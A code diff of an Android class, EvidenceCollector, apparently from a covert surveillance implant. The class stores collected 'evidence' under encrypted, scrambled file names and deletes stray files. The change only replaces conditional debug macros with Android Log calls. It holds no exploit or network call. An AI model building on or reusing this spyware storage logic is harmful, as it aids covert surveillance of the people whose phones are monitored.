@@ -18,6 +18,7 @@ import java.util.TreeMap;
 import java.util.Vector;
 
 import android.content.Context;
+import android.util.Log;
 
 import com.ht.RCSAndroidGUI.Debug;
 import com.ht.RCSAndroidGUI.Status;
@@ -34,11 +35,8 @@ import com.ht.RCSAndroidGUI.utils.Utils;
  * The Class EvidenceCollector.
  */
 public class EvidenceCollector {
-	// #ifdef DEBUG
 	/** The debug. */
-	private static Debug debug = new Debug("EvidenceColl");
-	// #endif
-
+	private static String TAG = "EvidenceColl";
 	/** The Constant LOG_EXTENSION. */
 	public static final String LOG_EXTENSION = ".mob";
 
@@ -136,10 +134,7 @@ public class EvidenceCollector {
 	 * Removes the progressive.
 	 */
 	public synchronized void removeProgressive() {
-		// #ifdef DEBUG
-		debug.info("Removing Progressive");
-		// #endif
-
+		Log.i(TAG,"Removing Progressive");
 		final Context content = Status.getAppContext();
 		content.deleteFile(PROG_FILENAME);
 	}
@@ -161,7 +156,7 @@ public class EvidenceCollector {
 
 			fos.close();
 		} catch (final IOException e) {
-			debug.error(e);
+			Log.e(TAG,e.toString());
 		}
 
 		return progessive;
@@ -183,13 +178,9 @@ public class EvidenceCollector {
 			fos.write(Utils.intToByteArray(logProgressive));
 			fos.close();
 		} catch (final IOException e) {
-			debug.error(e);
+			Log.e(TAG,e.toString());
 		}
-
-		// #ifdef DEBUG
-		debug.trace("Progressive: " + logProgressive);
-
-		// #endif
+		Log.d(TAG,"Progressive: " + logProgressive);
 		return logProgressive;
 	}
 
@@ -225,11 +216,7 @@ public class EvidenceCollector {
 			final String logType) {
 		final Date timestamp = log.timestamp;
 		final int progressive = getNewProgressive();
-
-		// #ifdef DBC
 		Check.asserts(progressive >= 0, "makeNewName fail progressive >=0");
-		// #endif
-
 		final Vector vector = new Vector();
 		final String basePath = Path.logs();
 
@@ -240,23 +227,16 @@ public class EvidenceCollector {
 		final String ds = Long.toString(progressive % 10000); // double to
 		// string
 		final int size = mask.length() - ds.length();
-		// #ifdef DBC
 		Check.asserts(size >= 0, "makeNewName: failed size>0");
-		// #endif
-
 		final String paddedProgressive = mask.substring(0, size) + ds;
 
 		final String fileName = paddedProgressive + "" + logType + ""
 				+ makeDateName(timestamp);
 
 		final String encName = encryptName(fileName + LOG_EXTENSION);
-
-		// #ifdef DBC
 		Check.asserts(!encName.endsWith("mob"), "makeNewName: " + encName
 				+ " ch: " + seed + " not scrambled: " + fileName
 				+ LOG_EXTENSION);
-		// #endif
-
 		Name name = new Name();
 		name.progressive = progressive;
 		name.basePath=basePath;
@@ -274,16 +254,12 @@ public class EvidenceCollector {
 	 *            the log name
 	 */
 	public void remove(final String logName) {
-		// #ifdef DEBUG
-		debug.trace("Removing file: " + logName);
-		// #endif
+		Log.d(TAG,"Removing file: " + logName);
 		final AutoFile file = new AutoFile(logName);
 		if (file.exists()) {
 			file.delete();
 		} else {
-			// #ifdef DEBUG
-			debug.warn("File doesn't exists: " + logName);
-			// #endif
+			Log.w(TAG,"File doesn't exists: " + logName);
 		}
 	}
 
@@ -296,10 +272,7 @@ public class EvidenceCollector {
 	 */
 
 	public synchronized int removeLogDirs(final int numFiles) {
-		// #ifdef DEBUG
-		debug.info("removeLogDirs");
-		// #endif
-
+		Log.i(TAG,"removeLogDirs");
 		int removed = 0;
 
 		removed = removeLogRecursive(Path.logs(), numFiles);
@@ -316,11 +289,7 @@ public class EvidenceCollector {
 	 * @return the int
 	 */
 	private int removeLogRecursive(final String basePath, final int numFiles) {
-
-		// #ifdef DEBUG
-		debug.info("RemovingLog: " + basePath + " numFiles: " + numFiles);
-		// #endif
-
+		Log.i(TAG,"RemovingLog: " + basePath + " numFiles: " + numFiles);
 		int numLogsDeleted = 0;
 
 		File fc;
@@ -331,17 +300,10 @@ public class EvidenceCollector {
 				final String[] fileLogs = fc.list();
 
 				for (final String file : fileLogs) {
-
-					// #ifdef DEBUG
-					debug.trace("removeLog: " + file);
-
-					// #endif
+					Log.d(TAG,"removeLog: " + file);
 					final int removed = removeLogRecursive(basePath + file,
 							numFiles - numLogsDeleted);
-					// #ifdef DEBUG
-					debug.trace("removeLog removed: " + removed);
-					// #endif
-
+					Log.d(TAG,"removeLog removed: " + removed);
 					numLogsDeleted += removed;
 				}
 			}
@@ -350,14 +312,9 @@ public class EvidenceCollector {
 			numLogsDeleted += 1;
 
 		} catch (final Exception e) {
-			// #ifdef DEBUG
-			debug.error("removeLog: " + basePath + " ex: " + e);
-			// #endif
+			Log.e(TAG,"removeLog: " + basePath + " ex: " + e);
 		}
-
-		// #ifdef DEBUG
-		debug.trace("removeLogRecursive removed: " + numLogsDeleted);
-		// #endif
+		Log.d(TAG,"removeLogRecursive removed: " + numLogsDeleted);
 		return numLogsDeleted;
 
 	}
@@ -370,10 +327,7 @@ public class EvidenceCollector {
 	 * @return the vector
 	 */
 	public Vector scanForDirLogs(final String currentPath) {
-		// #ifdef DBC
 		Check.requires(currentPath != null, "null argument");
-		// #endif
-
 		File fc;
 
 		final Vector vector = new Vector();
@@ -388,27 +342,16 @@ public class EvidenceCollector {
 					if (fdir.isDirectory()) {
 
 						vector.addElement(dir + "/");
-						// #ifdef DEBUG
-						debug.trace("scanForDirLogs adding: " + dir);
-						// #endif
-
+						Log.d(TAG,"scanForDirLogs adding: " + dir);
 					}
 				}
 
 			}
 
 		} catch (final Exception e) {
-			// #ifdef DEBUG
-			debug.error("scanForDirLogs: " + e);
-			// #endif
-
+			Log.e(TAG,"scanForDirLogs: " + e);
 		}
-
-		// #ifdef DEBUG
-		debug.trace("scanForDirLogs #: " + vector.size());
-
-		// #endif
-
+		Log.d(TAG,"scanForDirLogs #: " + vector.size());
 		return vector;
 	}
 
@@ -424,12 +367,9 @@ public class EvidenceCollector {
 	 * @return the vector
 	 */
 	public String[] scanForEvidences(final String currentPath, final String dir) {
-		// #ifdef DBC
 		Check.requires(currentPath != null, "null argument");
 		Check.requires(!currentPath.startsWith("file://"),
 				"currentPath shouldn't start with file:// : " + currentPath);
-		// #endif
-
 		final TreeMap<String, String> map = new TreeMap<String, String>();
 
 		File fcDir = null;
@@ -448,36 +388,23 @@ public class EvidenceCollector {
 
 				if (file.endsWith(encLogMask)) {
 					// String encName = fcFile.getName();
-					// #ifdef DEBUG
-					debug.trace("enc name: " + file);
-					// #endif
+					Log.d(TAG,"enc name: " + file);
 					final String plainName = decryptName(file);
-					// #ifdef DEBUG
-					debug.info("plain name: " + plainName);
-					// #endif
-
+					Log.i(TAG,"plain name: " + plainName);
 					map.put(plainName, file);
 				} else {
-					// #ifdef DEBUG
-					debug.info("wrong name, deleting: " + fcDir + "/" + file);
-					// #endif
+					Log.i(TAG,"wrong name, deleting: " + fcDir + "/" + file);
 					final File toDelete = new File(fcDir, file);
 					toDelete.delete();
 				}
 			}
 
 		} catch (final Exception e) {
-			// #ifdef DEBUG
-			debug.error("scanForLogs: " + e);
-			// #endif
-
+			Log.e(TAG,"scanForLogs: " + e);
 		} finally {
 
 		}
-
-		// #ifdef DEBUG
-		debug.trace("scanForLogs numDirs: " + map.size());
-		// #endif
+		Log.d(TAG,"scanForLogs numDirs: " + map.size());
 		final Collection<String> val = map.values();
 
 		return map.values().toArray(new String[] {});
